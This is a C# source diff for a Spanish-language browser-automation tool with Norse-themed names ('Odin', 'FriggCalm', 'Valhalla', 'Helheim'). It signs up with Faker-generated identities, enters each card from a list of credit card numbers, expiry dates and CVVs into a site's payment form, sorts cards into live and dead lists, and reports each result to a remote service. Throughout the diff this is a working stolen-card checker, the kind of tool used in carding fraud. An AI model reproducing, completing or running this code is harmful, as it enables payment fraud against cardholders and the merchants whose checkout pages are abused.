+                //            IconButtonVerify.Enabled = false;
+                //        }
+                //    }
+                //}
                 if (CreditCards.Count > 0)
                 {
-                    if (!Stop)
-                    {
-                        await ConsoleProgressDetail("", 0);
-                        await ConsoleProgressGeneral("Odin requiere un sacrificio.", 0, "Fail");
-                        await ConsoleProgressGeneral("Ofreciendo un sacrificio a Odin.", 0, "Success");
-                        await InvokeOdin();
-
-                    }
-                    else
-                    {
-                        await Task.Delay(2000);
-                        await ConsoleProgressDetail("", 0);
-                        await ConsoleProgressGeneral("ODIN PADRE DE TODO.", 0);
-                        Stop = false;
-                    }
+                    await ConsoleProgressDetail("", 0);
+                    await ConsoleProgressGeneral("FriggCalm requiere un sacrificio.", 0, "Fail");
+                    await ConsoleProgressGeneral("Ofreciendo un sacrificio a FriggCalm.", 0, "Success");
+                    await InvokeFrigg();
                 }
                 else
                 {
-                    await ConsoleProgressGeneral("Odin encontro un elfo oscuro y se detuvo.", 0, "Fail");
+                    await ConsoleProgressDetail("", 0);
+                    await ConsoleProgressGeneral("FriggCalm encontro un elfo oscuro y se detuvo.", 0, "Fail");
                 }
             }
             await Task.Delay(2000);
             await ConsoleProgressDetail("", 0);
-            await ConsoleProgressGeneral("ODIN PADRE DE TODO.", 0);
+            await ConsoleProgressGeneral("FRIGG REINA DE LOS ÆSIR.", 0);
         }
 
         private async Task<bool> LoadBrowser()
@@ -1871,8 +1826,8 @@ namespace Asgard
             bool loadBrowser = false;
             try
             {
-                await ConsoleProgressGeneral("Invocando a Odin..", 2);
-                string url = initialUrl + middleInitialUrl[new Random().Next(0, middleInitialUrl.Length)] + lastInitialUrl;
+                await ConsoleProgressGeneral("Invocando a FriggCalm..", 2);
+                string url = initialUrl;
                 if (LiveValkyries != null)
                 {
                     if (LiveValkyries.Count > 0)
@@ -1898,8 +1853,7 @@ namespace Asgard
             {
                 return await LoadPage();
             }
-
-            await ConsoleProgressGeneral("Invocando a Odin.. ¡Fallo!", 2, "Fail");
+            await ConsoleProgressGeneral("Invocando a FriggCalm.. ¡Fallo!", 2, "Fail");
             return false;
 
         }
@@ -1909,467 +1863,133 @@ namespace Asgard
 
             try
             {
-                await ConsoleProgressGeneral("Invocando a Odin...", 3);
-                return await StartOdin();
+                //////await browser.Screenshot("0.LoadPage_" + Asatru.GetTimestamp(DateTime.Now));
+                await ConsoleProgressGeneral("Invocando a FriggCalm...", 3);
+                return await StartFrigg();
             }
             catch (Exception) { }
 
-            await ConsoleProgressGeneral("Invocando a Odin... ¡Fallo!", 0, "Fail");
+            await ConsoleProgressGeneral("Invocando a FriggCalm... ¡Fallo!", 0, "Fail");
             return false;
-
         }
         #endregion
-
         #region  Gate Step By Step
-        private async Task<bool> StartOdin()
+        private async Task<bool> StartFrigg()
         {
             try
             {
-                await ConsoleProgressGeneral("Insertando algoritmos de extensión.", 10);
+                //browser.Screenshot("1.Load");
+                //////await browser.Screenshot("1.StartFrigg_" + Asatru.GetTimestamp(DateTime.Now));
+                await ConsoleProgressGeneral("Zombificando ambiente", 10);
                 await browser.DisableAlerts();
             }
             catch (Exception) { }
-
-            //async Task<bool> startOdin()
-            //{
-            //    Task<bool> a = browser.ElementInnerTextEquals("#root > main > header > div > div.header-desktopSecondaryActions-n-W > div:nth-child(5) > div > button > span", "1", "1.ExceptionStartOdinCart");
-            //    Task<bool> b = browser.ElementVisible("#root > main > div:nth-child(4) > section > div > div.ais-InfiniteHits > ul > li:nth-child(1) > a", "1.ExceptionStartOdin"); ;
-
-
-            //    return startOdin(await a, await b);
-            //}
-
-            Task<bool> task1 = browser.ElementInnerTextEquals("#root > main > header > div > div.header-desktopSecondaryActions-n-W > div:nth-child(5) > div > button > span", "1", "1.ExceptionStartOdinCart", 10);
-            Task<bool> task2 = browser.ElementVisible("#root > main > div:nth-child(4) > section > div > div.ais-InfiniteHits > ul > li:nth-child(1) > a", "1.ExceptionStartOdin", 10);
-
-            await Task.WhenAny(task1, task2);
-            var task1Result = task1.Result; // or await task1
-            var task2Result = task2.Result; // or await task2
-
-            //Task<bool> task1 =browser.ElementInnerTextEquals("#root > main > header > div > div.header-desktopSecondaryActions-n-W > div:nth-child(5) > div > button > span", "1", "1.ExceptionStartOdinCart");
-            //Task<bool> task2 = browser.ElementVisible("#root > main > div:nth-child(4) > section > div > div.ais-InfiniteHits > ul > li:nth-child(1) > a", "1.ExceptionStartOdin");
-            //await Task.WhenAll(tasks); // good
-            //Task.Run(() => Task.WhenAll(a,b));
-
-            //bool spanCartNumber = await browser.ElementInnerTextEquals("#root > main > header > div > div.header-desktopSecondaryActions-n-W > div:nth-child(5) > div > button > span", "1", "1.ExceptionStartOdinCart");
-            if (task1Result)
+            //await Task.Delay(10000);
+            //await browser.GetSource("registry");
+            bool InputEmail = await browser.ElementVisible("div.visible > div > div > form > div:nth-child(1) > div > input", "ExceptionLoad");
+            if (InputEmail)
             {
-                return await Cart();
+                return await LogIn();
             }
-
-            //bool anchorItem = await browser.ElementVisible("#root > main > div:nth-child(4) > section > div > div.ais-InfiniteHits > ul > li:nth-child(1) > a", "1.ExceptionStartOdin");
-            if (task2Result)
-            {
-                ////await browser.Screenshot("1.Load");
-                return await Item();
-            }
-            else
-            {
-                //MessageBox.Show("Recaptcha");
-                await browser.SoftKill();
-                await tokenCancel.Kill();
-                await InvokeOdin(false);
-            }
-
-            await ConsoleProgressGeneral("Insertando algoritmos de extensión. ¡Fallo!", 10, "Fail");
-            return false;
-
-        }
-
-        private async Task<bool> Item()
-        {
-            try
-            {
-                //await browser.Screenshot("2.Item");
-                await ConsoleProgressGeneral("Reubicando atributos influenciables.", 20);
-                await browser.DisableAlerts();
-                string clickItemInStock = @"let allItems = document.querySelectorAll('#root > main > div:nth-child(4) > section > div > div.ais-InfiniteHits > ul > li > a');
-                    let randItem = allItems[Math.floor(Math.random() * allItems.length)];
-                    randItem.click();";
-                await browser.ExecuteScript(clickItemInStock);
-            }
-            catch (Exception) { }
-            bool buttonSizeSelected = await browser.ElementVisible("#productFullDetail > div.productFullDetail-options-ziU > div:nth-child(2) > div > div > button.tile-root_selected-1uw", "2.1.ExceptionItemSizeSelected");
-            if (buttonSizeSelected)
-            {
-                return await AddToCart();
-            }
-            else
-            {   //#productFullDetail > div.productFullDetail-options-ziU > div:nth-child(2) > div > div > button:nth-child(2)
-                //#productFullDetail > div.productFullDetail-options-ziU > div:nth-child(2) > div > div > button
-                bool buttonSize = await browser.ElementVisible("#productFullDetail > div.productFullDetail-options-ziU > div:nth-child(2) > div > div > button", "2.2.ExceptionItemSelectSize");
-                if (buttonSize)
-                {
-                    return await SelectSize();
-                }
-                else
-                {
-                    bool buttonSizeOnlySelected = await browser.ElementVisible("#productFullDetail > div.productFullDetail-options-ziU > div > div > div > button.tile-root_selected-1uw", "2.1.ExceptionItemSizeOnlySelected");
-                    if (buttonSizeOnlySelected)
-                    {
-                        ////await browser.Screenshot("2.Item");
-                        return await AddToCart();
-                    }
-                    else
-                    {                                                     //#productFullDetail > div.productFullDetail-options-ziU > div > div > div > button:nth-child(1)
-                        bool buttonSizeOnly = await browser.ElementVisible("#productFullDetail > div.productFullDetail-options-ziU > div > div > div > button", "2.1.ExceptionItemSizeOnly");
-                        if (buttonSizeOnly)
-                        {
-                            return await SelectSizeOnly();
-                        }
-
-                    }
-                }
-
-            }
-            await ConsoleProgressGeneral("Reubicando atributos influenciables. ¡Fallo!", 20, "Fail");
+            await ConsoleProgressGeneral("Zombificando ambiente. !Fallo¡", 10, "Fail");
             return false;
         }
 
-
-
-        private async Task<bool> SelectSizeOnly()
+        private async Task<bool> LogIn()
         {
             try
             {
-                //await browser.Screenshot("3.SelectSizeOnly");
-                await ConsoleProgressGeneral("Importando anclajes de desprogramación séctica.", 25);
-                await browser.DisableAlerts();
+                // browser.Screenshot("2.LogIn");
+                //////await browser.Screenshot("2.Login_" + Asatru.GetTimestamp(DateTime.Now));
+                await ConsoleProgressGeneral("Resolviendo teorema de Gibbs.", 30);
+                FullName = Faker.Person.FullName;
+                await browser.SendKeys("div.visible > div > div > form > div:nth-child(1) > div > input", Faker.Internet.Email());
+                await browser.SendKeys("div.visible > div > div > form > div:nth-child(2) > div > input", Faker.Internet.Password());
+                await browser.SendKeys("div.visible > div > div > form > div:nth-child(3) > div > input", FullName);
 
-                string clickSize = @"let allSizes = document.querySelectorAll('#productFullDetail > div.productFullDetail-options-ziU > div > div > div > button:not([disabled])');
-                    let randSize = allSizes[Math.floor(Math.random() * allSizes.length)];
-                    randSize.click();";
-                await browser.ExecuteScript(clickSize);
+                await Task.Delay(1000);
+                await browser.Click("div.visible > div > div > form > button");
+                await Task.Delay(3000);
             }
             catch (Exception) { }
 
-            bool buttonAddToCart = await browser.ElementVisible("#productFullDetail > div.productFullDetail-cartActions-Uw6 > button", "3.ExceptionSelectWidth");
-            if (buttonAddToCart)
+            bool divModal = await browser.ElementInvisible("div.visible", "ExceptionLogIn");
+            if (divModal)
             {
-                return await AddToCart();
-            }
-
-            await ConsoleProgressGeneral("Importando anclajes de desprogramación séctica. ¡!", 25, "Fail");
-            return false;
-
-        }
-
-        private async Task<bool> SelectSize()
-        {
-            try
-            {
-                //await browser.Screenshot("3.SelectSize");
-                await ConsoleProgressGeneral("Importando anclajes de desprogramación séctica.", 25);
-                await browser.DisableAlerts();
-
-                string clickSize = @"let allSizes = document.querySelectorAll('#productFullDetail > div.productFullDetail-options-ziU > div:nth-child(2) > div > div > button:not([disabled])');
-                    let randSize = allSizes[Math.floor(Math.random() * allSizes.length)];
-                    randSize.click();";
-                await browser.ExecuteScript(clickSize);
-            }
-            catch (Exception) { }
-            //
-
-            bool buttonWidthSelected = await browser.ElementVisible("#productFullDetail > div.productFullDetail-options-ziU > div:nth-child(1) > div > div > button.tile-root_selected-1uw", "3.1.ExceptionSelectSizeSelectedWidth");
-            if (buttonWidthSelected)
-            {
-                return await AddToCart();
-            }
-            else
-            {
-                bool buttonWidth = await browser.ElementVisible("#productFullDetail > div.productFullDetail-options-ziU > div:nth-child(1) > div > div > button", "3.2.ExceptionSelectSize");
-                if (buttonWidth)
+                //////await browser.Screenshot("2.1.Login_" + Asatru.GetTimestamp(DateTime.Now));
+                bool divWait = await browser.ElementInvisible("#take-a-deep-breath", "ExceptionLogInWait");
+                if (divWait)
                 {
-                    return await SelectWidth();
+                    //////await browser.Screenshot("2.2.Login_" + Asatru.GetTimestamp(DateTime.Now));
+                    return await Last();
                 }
             }
-
-            await ConsoleProgressGeneral("Importando anclajes de desprogramación séctica. ¡!", 25, "Fail");
+            await ConsoleProgressGeneral("Resolviendo teorema de Gibbs. ¡Fallo!", 30, "Fail");
             return false;
-        }
-
-        private async Task<bool> SelectWidth()
-        {
-            try
-            {
-                //await browser.Screenshot("3.SelectWidth");
-                await ConsoleProgressGeneral("Importando anclajes de desprogramación séctica.", 27);
-                await browser.DisableAlerts();
-
-                string clickSize = @"let allWidths = document.querySelectorAll('#productFullDetail > div.productFullDetail-options-ziU > div:nth-child(1) > div > div > button:not([disabled])');
-                    let randWidth = allWidths[Math.floor(Math.random() * allWidths.length)];
-                    randWidth.click();";
-                await browser.ExecuteScript(clickSize);
-            }
-            catch (Exception) { }
-
-            bool buttonAddToCart = await browser.ElementVisible("#productFullDetail > div.productFullDetail-cartActions-Uw6 > button", "3.ExceptionSelectWidth");
-            if (buttonAddToCart)
-            {
-                return await AddToCart();
-            }
-
-            await ConsoleProgressGeneral("Importando anclajes de desprogramación séctica. ¡!", 27, "Fail");
-            return false;
-        }
-
-        private async Task<bool> AddToCart()
-        {
-
-            try
-            {
-                //await browser.Screenshot("4.AddToCart");
-                await ConsoleProgressGeneral("Trazando retícula de Splines.", 30);
-                await browser.DisableAlerts();
-                string clickAddToCart = @"document.querySelector('#productFullDetail > div.productFullDetail-cartActions-Uw6 > button').click();";
-                await browser.ExecuteScript(clickAddToCart);
-
-            }
-            catch (Exception) { }
-
-            bool spanCartNumber = await browser.ElementInnerTextEquals("#root > main > header > div > div.header-desktopSecondaryActions-n-W > div:nth-child(5) > div > button > span", "1", "4.ExceptionAddToCart");
-            if (spanCartNumber)
-            {
-                return await Cart();
-            }
-
-            await ConsoleProgressGeneral("Trazando retícula de Splines. ¡Fallo!", 30, "Fail");
-            return false;
-        }
-
-        //private async Task<bool> ViewCart()
-        //{
-
-        //    try
-        //    {
-        //        //////await browser.Screenshot("4.AddToCart");
-        //        await ConsoleProgressGeneral("Invirtiendo escalafón profesional.", 40);
-        //        await browser.DisableAlerts();
-        //        string clickViewcart = @"document.querySelector('p.gritter-link.linkEase > a').click();";
-        //        await browser.ExecuteScript(clickViewcart);
-        //    }
-        //    catch (Exception) { }
-
-        //    bool anchorCheckout = await browser.ElementVisible("#btnCheckoutTop", "ExceptionViewCart");
-        //    if (anchorCheckout)
-        //    {
-        //        return await Checkout();
-        //    }
-        //    await ConsoleProgressGeneral("Invirtiendo escalafón profesional. ¡Fallo!", 40, "Fail");
-        //    return false;
-
-        //}
-
-        private async Task<bool> Cart()
-        {
-
-            try
-            {
-                //await browser.Screenshot("5.Cart");
-                await ConsoleProgressGeneral("Interrelacionando distribución regular de caos.", 40);
-                await browser.DisableAlerts();
-                await browser.LoadPage($"https://{web}/cart");
-            }
-            catch (Exception) { }
-
-            bool buttonGoToCheckout = await browser.ElementVisible("#root > main > div.main-page-1Ex > div > div > div.cartPage-summary_container-2pt > div.priceSummary-summarySection-1R- > div.priceSummary-btnArea-2th > div > button", "5.ExceptionCheckout");
-            if (buttonGoToCheckout)
-            {
-                return await Checkout();
-            }
-            await ConsoleProgressGeneral("Interrelacionando distribución regular de caos. ¡Fallo!", 40, "Fail");
-            return false;
-
-        }
-
-        private async Task<bool> Checkout()
-        {
-
-            try
-            {
-                //await browser.Screenshot("5.Checkout");
-                await ConsoleProgressGeneral("Interrelacionando distribución regular de caos.", 40);
-                await browser.DisableAlerts();//
-                                              // browser.Load($"https://{web}/checkout");
-                string clickCheckout = @"document.querySelector('#root > main > div.main-page-1Ex > div > div > div.cartPage-summary_container-2pt > div.priceSummary-summarySection-1R- > div.priceSummary-btnArea-2th > div > button').click();";
-                await browser.ExecuteScript(clickCheckout);
-            }
-            catch (Exception) { }
-            //#root > aside:nth-child(10) > div.checkoutProcess-body-2hF > button.guestCheckout
-            bool buttonGuestCheckout = await browser.ElementVisible("#root > aside:nth-child(10) > div.checkoutProcess-body-2hF > button.guestCheckout", "5.ExceptionCheckout");
-            if (buttonGuestCheckout)
-            {
-                return await GuestCheckout();
-            }
-
-            await ConsoleProgressGeneral("Interrelacionando distribución regular de caos. ¡Fallo!", 40, "Fail");
-            return false;
-
-        }
-
-        private async Task<bool> GuestCheckout()
-        {
-            try
-            {
-                //await browser.Screenshot("5.GuestCheckout");
-                await ConsoleProgressGeneral("Interrelacionando distribución regular de caos.", 40);
-                await browser.DisableAlerts();//
-                                              // browser.Load($"https://{web}/checkout");
-                string clickGuestCheckout = @"document.querySelector('#root > aside:nth-child(10) > div.checkoutProcess-body-2hF > button.guestCheckout').click();";
-                await browser.ExecuteScript(clickGuestCheckout);
-            }
-            catch (Exception) { }
-
-            bool inputEmail = await browser.ElementVisible("#js-checkoutForm > div.guestForm-email-1Xd > div > span > span.fieldIcons-input-11Y > input", "5.ExceptionGuestCheckout");
-            if (inputEmail)
-            {
-                return await ShippingDetails();
-            }
-
-            await ConsoleProgressGeneral("Interrelacionando distribución regular de caos. ¡Fallo!", 40, "Fail");
-            return false;
-
-        }
-
-        //#root > aside:nth-child(10) > div.checkoutProcess-body-2hF > button.guestCheckout
-        private async Task<bool> ShippingDetails()
-        {
-
-            try
-            {
-                //await browser.Screenshot("6.ShippingDetails");
-                await ConsoleProgressGeneral("Reconfiguración de los algoritmos genéticos.", 50);
-                await browser.DisableAlerts();
-                //#js-checkoutForm > div.guestForm-email-1Xd > div > span > span.fieldIcons-input-11Y > input
-                await browser.SendKeys("input[name=email]", Faker.Internet.Email());
-                await Task.Delay(500);
-                await browser.SendKeys("#js-checkoutForm > div.guestForm-firstname-2Vj > div > span > span.fieldIcons-input-11Y > input", Faker.Name.FirstName());
-                await Task.Delay(500);
-                await browser.SendKeys("#js-checkoutForm > div.guestForm-lastname-1_A > div > span > span.fieldIcons-input-11Y > input", Faker.Name.LastName());
-                await Task.Delay(500);
-                await browser.SendKeys("#react-google-places-autocomplete-input", Faker.Address.StreetAddress());
-                await browser.SendKeys("#js-checkoutForm > div.guestForm-street1-3_7 > div > span > span.fieldIcons-input-11Y > input", Faker.Address.SecondaryAddress());
-                await Task.Delay(500);
-                await browser.SendKeys("#js-checkoutForm > div.guestForm-city-1bh > div > span > span.fieldIcons-input-11Y > input", Faker.Address.City());
-                await Task.Delay(500);
-                await browser.SendKeys("#js-checkoutForm > div.guestForm-region-1US > div > select", Faker.Address.StateAbbr());
-                await Task.Delay(500);
-                await browser.SendKeys("#js-checkoutForm > div.guestForm-postcode-1ip > div > span > span.fieldIcons-input-11Y > input", Faker.Address.ZipCode("#####"));
-                await Task.Delay(500);
-                await browser.SendKeys("#js-checkoutForm > div.guestForm-telephone-3WS > div > span > span.fieldIcons-input-11Y > input", Faker.Phone.PhoneNumber());
-                await Task.Delay(5000);
-                //await browser.Click("#root > main > div > div > div > div.checkoutPage-checkout_information-1l2 > div.checkoutPage-shipping_information_container-1Ro > div.shippingMethod-root-1QK > form > div.shippingMethod-formButtons-tac > button");
-
-                //string clickButtonSaveContinue = @"document.querySelector('#root > main > div > div > div > div.checkoutPage-checkout_information-1l2 > div.checkoutPage-shipping_information_container-1Ro > div.shippingMethod-root-1QK > form > div.shippingMethod-formButtons-tac > button').click();";
-                //await browser.ExecuteScript(clickButtonSaveContinue);
-            }
-            catch (Exception) { }
-
-            bool buttonSaveAndContinue = await browser.ElementVisible("#root > main > div > div > div > div.checkoutPage-checkout_information-1l2 > div.checkoutPage-shipping_information_container-1Ro > div.shippingMethod-root-1QK > form > div.shippingMethod-formButtons-tac > button", "6.ExceptionLogin", 40);
-            if (buttonSaveAndContinue)
-            {
-                return await SaveAndContinue();
-            }
-
-            await ConsoleProgressGeneral("Reconfiguración de los algoritmos genéticos. ¡Fallo!", 50, "Fail");
-            return false;
-        }
-
-        private async Task<bool> SaveAndContinue()
-        {
-            try
-            {
-                //await browser.Screenshot("7.SaveAndContinue");
-                await ConsoleProgressGeneral("Recalibración del motor de motivación.", 70);
-                await browser.DisableAlerts();
-                await browser.Click("#root > main > div > div > div > div.checkoutPage-checkout_information-1l2 > div.checkoutPage-shipping_information_container-1Ro > div.shippingMethod-root-1QK > form > div.shippingMethod-formButtons-tac > button");
-            }
-            catch (Exception) { }
-
-            bool spanPaymentMethod = await browser.ElementVisible("#root > main > div > div > div > div.checkoutPage-checkout_information-1l2 > div.checkoutPage-payment_information_container-3zC > form > div > div > div > div:nth-child(3) > div > div.checkoutPage-place_order_button_wrap-1qi > span > button", "6.ExceptionSaveAndContinue");
-            if (spanPaymentMethod)
-            {
-                await Task.Delay(5000);
-                //await browser.Screenshot("8.PaymentMethod");
-                // return await Shipping();
-                return await Last();
-            }
-            else
-            {
-                bool buttonSaveAndContinue = await browser.ElementVisible("#root > main > div > div > div > div.checkoutPage-checkout_information-1l2 > div.checkoutPage-shipping_information_container-1Ro > div.shippingMethod-root-1QK > form > div.shippingMethod-formButtons-tac > button", "6.ExceptionLogin", 40);
-                if (buttonSaveAndContinue)
-                {
-                    //await browser.Screenshot("7.1.PaymentMethod");
-                    return await SaveAndContinue();
-                }
-            }
-            await ConsoleProgressGeneral("Recalibración del motor de motivación. ¡Fallo!", 70, "Fail");
-            return false;
-
         }
 
         private async Task<bool> Last()
         {
             try
             {
-                //await browser.Screenshot("8.Last");
-                await ConsoleProgressGeneral("Difundiendo rumores.", 70);
+                // browser.Screenshot("3.Last");
+                //////await browser.Screenshot("3.Last_" + Asatru.GetTimestamp(DateTime.Now));
+                await ConsoleProgressGeneral("Mancillando reputaciones.", 50);
                 string listLiveCreditCard = string.Empty;
                 string listDieCreditCard = string.Empty;
+
                 if (CreditCards.Count > 0)
                 {
-                    //LiveCreditCards = new List<List<string>>();
-                    //DieCreditCards = new List<List<string>>();
+                    LiveCreditCards = new List<List<string>>();
+                    DieCreditCards = new List<List<string>>();
                     int creditCardsCount = CreditCards.Count;
-                    double x = 70;
+
+                    //double x = 50 + CalcIncrementX(50);
+                    double x = 50;
                     for (int i = 0; i < creditCardsCount;)
                     {
-                        await ConsoleProgressDetail("Sintetización de la selección natural.", 0);
+                        await ConsoleProgressDetail("Cuidado con el dragón.", 0);
                         string number = CreditCards[i][0];
-                        string month = CreditCards[i][1];
-                        string year = CreditCards[i][2].Substring(2, 2);
+                        string month = Int32.Parse(CreditCards[i][1]).ToString();
+                        string year = Int32.Parse(CreditCards[i][2].Substring(2, 2)).ToString();
                         string cvv = CreditCards[i][3];
 
-                        bool card = await Card(number, month, year, cvv);
-                        if (card)
+                        bool latestData = await LatestData(number, month, year, cvv);
+                        if (latestData)
                         {
                             bool forseti = await Forseti();
                             if (forseti)
                             {
-                                //await browser.Screenshot("11.Valhalla_" + number);
                                 await ConsoleProgressDetail(string.Join("|", CreditCards[i].ToArray()), 100);
                                 if (TextBoxValhalla.Text == string.Empty)
                                 {
                                     listLiveCreditCard += string.Join("|", CreditCards[i].ToArray());
-                                    //   await Asatru.SetValhalla(UserId, Token, GateId, string.Join("|", CreditCards[i].ToArray()));
                                 }
                                 else
                                 {
                                     listLiveCreditCard = TextBoxValhalla.Text;
                                     listLiveCreditCard += "\r\n" + string.Join("|", CreditCards[i].ToArray());
-                                    //    await Asatru.SetValhalla(UserId, Token, GateId, string.Join("|", CreditCards[i].ToArray()));
                                 }
+
+                                TextBoxValhalla.Text = listLiveCreditCard;
 
                                 IEnumerable<Task> tasks = new Task[] {
                                     Asatru.SetValhalla(UserId, Token, GateId, string.Join("|", CreditCards[i].ToArray())),
                                     ReduceListCreditCards(),
-                                    OChecker.SetLabelGetRunes(),
-                                    Block()
+                                    Block(),
+                                    OChecker.SetLabelGetRunes()
                                 };
-                                await Task.WhenAll(tasks); // good
 
-                                TextBoxValhalla.Text = listLiveCreditCard;
+                                await Task.Run(() => Task.WhenAll(tasks));
 
-                                x += CalcIncrementX(30);
+                                x += CalcIncrementX(50);
                                 await ConsoleProgressGeneral("Trazando retículas irreticulizables.", (int)Math.Round(x));
-
                                 return false;
                             }
                             else
                             {
                                 if (!forsetiError)
                                 {
-                                    //await browser.Screenshot("11.Helheim_" + number);
                                     await ConsoleProgressDetail(string.Join("|", CreditCards[i].ToArray()), 100);
                                     if (TextBoxHelheim.Text == string.Empty)
                                     {
@@ -2381,9 +2001,15 @@ namespace Asgard
                                         listDieCreditCard += "\r\n" + string.Join("|", CreditCards[i].ToArray());
                                     }
 
-                                    await Task.WhenAll(Asatru.SetHelheim(UserId, Token, GateId, string.Join("|", CreditCards[i].ToArray())), ReduceListCreditCards()); //good
+                                    IEnumerable<Task> tasks = new Task[] {
+                                        Asatru.SetHelheim(UserId, Token, GateId, string.Join("|", CreditCards[i].ToArray())),
+                                        ReduceListCreditCards()
+                                    };
+
+                                    await Task.WhenAll(tasks);
+
                                     TextBoxHelheim.Text = listDieCreditCard;
-                                    x += CalcIncrementX(30);
+                                    x += CalcIncrementX(50);
                                     await ConsoleProgressGeneral("Trazando retículas irreticulizables.", (int)Math.Round(x));
                                     continue;
                                 }
@@ -2394,64 +2020,41 @@ namespace Asgard
                                 }
                             }
                         }
+                        else { return false; }
                     }
                 }
             }
             catch (Exception) { }
 
-            if (CreditCards.Count > 0)
+            if (CreditCards.Count() > 0)
             {
-                await ConsoleProgressGeneral("Difundiendo rumores. ¡Fallo!", 90, "Fail");
+                await ConsoleProgressGeneral("Mancillando reputaciones. ¡Fallo!", 90, "Fail");
                 return false;
             }
             return true;
         }
 
-
-        private async Task<bool> Card(string number, string month, string year, string cvv)
+        private async Task<bool> LatestData(string number, string month, string year, string cvv)
         {
             try
             {
-                //await browser.Screenshot("9.Card");
-                await ConsoleProgressDetail("Incremento de las conductas laborales.", 60);
-                await browser.DisableAlerts();
-                await browser.ClickXY(200, 50);
-                await Task.Delay(500);
-                if (firstTime)
-                {
-                    await browser.ClickXY(90, 460);
-                    firstTime = false;
-                }
-                else
-                {
-                    await browser.ClickXY(90, 510);
-                }
-                //await Task.Delay(500);
+                //////await browser.Screenshot("4.LatestData_" + Asatru.GetTimestamp(DateTime.Now));
+                await ConsoleProgressDetail("Fregando animaciones.", 50);
+
+                await browser.SendKeys("#id-first-name > input[type=text]", FullName);
+                await browser.SendKeyCode(0x09);
                 await browser.SendKeys(string.Empty, number);
                 await browser.SendKeyCode(0x09);
-                //await Task.Delay(500);
-                await browser.SendKeys(string.Empty, month);
-                await browser.SendKeys(string.Empty, year);
+                await browser.SendKeys(string.Empty, month + year);
                 await browser.SendKeyCode(0x09);
-                //await Task.Delay(500);
                 await browser.SendKeys(string.Empty, cvv);
-                await Task.Delay(100);
-                //await browser.Screenshot("9.CardFill");
-                await browser.ExecuteScript("document.querySelector('#root > main > div > div > div > div.checkoutPage-checkout_information-1l2 > div.checkoutPage-payment_information_container-3zC > form > div > div > div > div:nth-child(3) > div > div.checkoutPage-place_order_button_wrap-1qi > span > button').click()");
+                await browser.SendKeyCode(0x09);
+                string clickContinue = @"document.querySelector('button[type=submit]').click();";
+                await browser.ExecuteScript(clickContinue);
                 return true;
             }
             catch (Exception) { }
-
-            //bool divError = await browser.ElementVisible("#root > main > div > div > div > div.checkoutPage-heading_container-3Oy > div", "6.ExceptionCard");
-            //if (divError)
-            //{
-            //    return true;
-            //}
-            //else
-            //{
-            //    return true;
-            //}
-            await ConsoleProgressDetail("Incremento de las conductas laborales. ¡Fallo!", 60, "Fail");
+            await ConsoleProgressDetail("Fregando animaciones. ¡Fallo!", 90, "Fail");
             return false;
         }
 
@@ -2459,37 +2062,50 @@ namespace Asgard
         {
             try
             {
-                //await browser.Screenshot("10.Forseti");
-                await ConsoleProgressDetail("Insuflando furia subatómica.", 90);
-                await browser.DisableAlerts();
-                if (await browser.ElementInnerTextNotContent("#root > main > div > div > div > div.checkoutPage-heading_container-3Oy > div > span", "oops", "10.ExceptionForseti"))
+                await ConsoleProgressDetail("Eliminando trucos potenciales.", 90);
+                bool divErrorCardNumber = await browser.ElementVisible("#card-number > div:nth-child(2)", "ExceptionForsetiHelheimDivErrorCardNumber", 10);
+                if (divErrorCardNumber)
                 {
-                    bool helheim = await browser.ElementInnerTextNotContent("#root > main > div > div > div > div.checkoutPage-heading_container-3Oy > div > span", "Gateway Rejected: cvv", "10.ExceptionHelheim");
-                    if (helheim)
+                    await browser.LoadPage(browser.Address);
+                    return false;
+                }
+                else
+                {
+                    bool status = false;
+                    for (int i = 0; i < 10; i++)
                     {
-                        string removeDivError = "document.querySelector('#root > main > div > div > div > div.checkoutPage-heading_container-3Oy > div > span').innerHTML='oops';";
-                        await browser.ExecuteScript(removeDivError);
+                        string getButtonStatus = "document.querySelector('form > button[type=submit]').getAttribute('class').includes('disabled')";
+                        if ((bool)await browser.ExecuteScript(getButtonStatus))
+                        {
+                            status = true;
+                            break;
+                        }
+                        await Task.Delay(1000);
+                    }
+
+                    if (status)
+                    {
+                        await browser.LoadPage(browser.Address);
                         return false;
                     }
                     else
                     {
-                        bool valhalla = await browser.ElementInnerTextContent("#root > main > div > div > div > div.checkoutPage-heading_container-3Oy > div > span", "Gateway Rejected: cvv", "10.ExceptionValhalla");
-                        if (valhalla)
+                        bool homepage = await browser.ElementVisible("#content-app", "ExceptionForsetiValhallaHomepage");
+                        if (homepage)
                         {
                             return true;
                         }
                     }
                 }
-
             }
             catch (Exception) { }
-            await ConsoleProgressDetail("Insuflando furia subatómica. ¡Fallo!", 90, "Fail");
+            await ConsoleProgressDetail("Eliminando trucos potenciales. ¡Fallo!", 90, "Fail");
             forsetiError = true;
             return false;
         }
 
-        #endregion
 
+        #endregion
         #region Methods
         private async Task ReduceListCreditCards()
         {
@@ -2515,11 +2131,12 @@ namespace Asgard
                     {
                         listCreditCard = string.Empty;
                     }
-                    //await Task.Delay(100);
+                    //await Task.Delay(50);
                 }
                 TextBoxCreditCards.Text = listCreditCard;
             }
-            catch (Exception) { }
+
+            catch (Exception) {/* throw; */}
         }
 
         private double CalcIncrementX(double value)
@@ -2532,65 +2149,9 @@ namespace Asgard
             catch (Exception) { }
             return 0;
         }
-
-
-        private async Task ClickButtonOK()
-        {
-            try
-            {
-                ////await browser.Screenshot("9.ClickButtonOK");
-                await browser.DisableAlerts();
-                string clickOk = @"document.querySelector('div.fancybox-wrap.fancybox-desktop.fancybox-type-html.fancybox-opened > div > div > div > div > div > div > input').click();";
-                await browser.ExecuteScript(clickOk);
-            }
-            catch (Exception) { }
-        }
-
-        private async Task ClickPlaceOrder()
-        {
-            try
-            {
-                ////await browser.Screenshot("9.ClickPlaceOrder");
-                await browser.Scroll(0, 500);
-                await browser.Scroll(100, 500);
-                string buttonPlaceOrder = @"document.querySelector('#btnPlaceOrder').click();";
-                await browser.ExecuteScript(buttonPlaceOrder);
-            }
-            catch (Exception) { }
-        }
-
-
-
-
-        private async Task EditPayment()
-        {
-            try
-            {
-                ////await browser.Screenshot("11.EditPayment");
-                string clickButtonOk = @"document.querySelector('#ctl00_bodytag > div.fancybox-wrap.fancybox-desktop.fancybox-type-html.fancybox-opened > div > div > div > div > div > div > input').click();";
-                await browser.ExecuteScript(clickButtonOk);
-                await Task.Delay(1000);
-                await browser.ExecuteScript("document.querySelector('#lnkCCEdit').click()");
-            }
-            catch (Exception) { }
-        }
-
         #endregion
 
         #endregion
-
-        private void iconButton1_Click(object sender, EventArgs e)
-        {
-            CookieMonster visitor = new CookieMonster(all_cookies =>
-            {
-                var sb = new StringBuilder();
